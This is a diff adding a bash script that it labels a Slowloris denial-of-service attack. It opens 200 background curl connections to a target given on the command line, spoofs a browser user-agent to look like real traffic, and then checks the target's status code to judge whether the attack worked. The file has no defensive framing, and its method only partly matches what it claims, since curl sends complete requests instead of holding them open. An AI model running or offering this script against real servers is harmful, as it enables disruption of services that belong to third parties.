@@ -1,0 +1,45 @@
+#!/bin/bash
+
+# Ensure the script is run with an argument (target domain)
+if [ -z "$1" ]; then
+    echo "Usage: $0 <target>"
+    exit 1
+fi
+
+# Target URL and IP
+TARGET=$1
+
+# Number of connections to open
+CONNECTIONS=200
+
+# Adjusting the sleep interval for faster connections (set to a lower value for more aggressive testing)
+SLEEP_INTERVAL=5  # Change this to a smaller value for faster connection attempts
+
+# User-Agent to mimic a real browser
+USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+
+# Loop to open multiple connections
+for (( i=1; i<=CONNECTIONS; i++ ))
+do
+    curl -s -X GET "$TARGET" --user-agent "$USER_AGENT" --header "Connection: keep-alive" -o /dev/null &
+    echo "Connection $i opened."
+    sleep $SLEEP_INTERVAL  # Control the delay between connection attempts
+done
+
+# Check the server's response after the attack
+echo "Checking server responsiveness after initiating the attack..."
+STATUS_CODE=$(curl -s -o /dev/null -w "%{http_code}" $TARGET)
+
+# Output the status code
+if [ "$STATUS_CODE" -eq "200" ]; then
+    echo "The target $TARGET is still responsive (HTTP 200 OK). The attack might not have been effective."
+elif [ "$STATUS_CODE" -eq "301" ]; then
+    echo "The target $TARGET is behind a redirection (HTTP 301). The attack might not have been effective."
+elif [ "$STATUS_CODE" -eq "403" ]; then
+    echo "The target $TARGET is blocking the attack (HTTP 403 Forbidden)."
+else
+    echo "The target $TARGET might have been affected. Status code: $STATUS_CODE"
+fi
+
+echo "Slowloris attack completed. Exiting..."
+exit 0
